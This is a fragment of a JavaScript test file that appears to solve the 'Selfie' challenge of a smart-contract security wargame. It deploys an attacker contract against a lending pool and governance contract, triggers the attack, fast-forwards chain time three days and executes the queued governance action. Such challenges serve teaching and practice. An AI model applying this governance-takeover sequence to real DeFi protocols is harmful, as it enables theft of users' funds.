...
describe('[Challenge] Selfie', function () {
    ...
    it('Exploit', async function () {
        ...
        const selfieAttackerContractFactory = await ethers.getContractFactory("SelfieAttacker");
        const selfieAttackerContract = await selfieAttackerContractFactory.deploy(this.pool.address, this.governance.address, this.token.address)
            .then(c => c.connect(attacker));
        let tx = await selfieAttackerContract.attack();
        await tx.wait();

        await ethers.provider.send("evm_increaseTime", [3 * 24 * 60 * 60]);

        tx = await selfieAttackerContract.executeAction();
        await tx.wait();
    });
